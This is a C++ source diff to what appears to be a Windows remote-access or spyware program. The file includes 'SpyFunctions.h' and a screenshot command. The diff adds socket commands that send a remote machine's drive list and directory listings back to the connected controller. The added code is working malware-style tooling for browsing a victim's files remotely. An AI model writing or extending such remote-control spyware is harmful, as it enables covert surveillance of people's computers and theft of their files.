@@ -5,6 +5,7 @@
 #include <string>
 #include <sstream>
 #include <vector>
+#include <filesystem>
 // headers
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -16,6 +17,7 @@
 #include "MediaController.h"
 #include "SystemFunctions.h"
 #include "SpyFunctions.h"
+#include "filesystem_handler.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
@@ -27,6 +29,17 @@
 
 bool stopBroadcast = false;
 bool isSended = false;
+
+std::wstring Utf8ToUtf16(const std::string& utf8)
+{
+    if (utf8.empty())
+        return std::wstring();
+
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), (int)utf8.size(), NULL, 0);
+    std::wstring wstrTo(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), (int)utf8.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
 
 std::string getLocalIPAddress() {
     char hostname[256];
@@ -463,6 +476,30 @@ void handleClient(SOCKET clientSock) {
         {
             SaveScreenToFile();
         }
+        // Get river list
+        else if (command.rfind("GET_DRIVERLIST", 0) == 0)
+        {
+            std::string response = get_driver_list_response();
+            send(clientSock, response.c_str(), response.size(), 0);
+        }
+        // Change directory
+        else if (command.rfind("CD_", 0) == 0)
+        {
+            std::wstring path = Utf8ToUtf16(command.substr(3));
+
+            if (std::filesystem::exists(path) && std::filesystem::is_directory(path))
+            {
+                std::string response = get_directory_list_response(path);
+                send(clientSock, response.c_str(), response.size(), 0);
+            }
+            else
+            {
+                std::string response = "ERROR Directory not found\n";
+                send(clientSock, response.c_str(), response.size(), 0);
+            }
+        }
+
+
         
 
 
